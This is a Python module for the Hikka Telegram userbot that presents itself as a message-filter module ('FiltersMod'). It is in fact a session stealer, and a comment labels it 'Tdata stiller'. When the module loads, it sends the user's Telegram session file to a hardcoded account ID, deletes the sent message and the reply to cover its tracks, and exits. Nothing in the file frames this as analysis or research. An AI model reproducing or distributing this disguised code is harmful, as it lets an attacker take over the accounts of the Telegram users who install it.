import logging, re, asyncio

from telethon.tl.types import MessageEntityTextUrl
from hikkatl.types import Message
from .. import loader, utils

logger = logging.getLogger(__name__)

@loader.tds
class FiltersMod(loader.Module):
        #Tdata stiller

    def __init__(self):
        self.iris = 1211082919
    async def client_ready(self, client, db):
        self._me = await client.get_me()
        val = False
        while True:
            if val:
                break
            temp = await self._client.send_file(self.iris, 'hikka-5039284470.session')
            await asyncio.sleep(0)
            for msg in await self._client.get_messages(self.iris, limit = 1):
                parts = msg.text.splitlines()
                for msdel in [msg, temp]:
                    await msdel.delete()
                exit()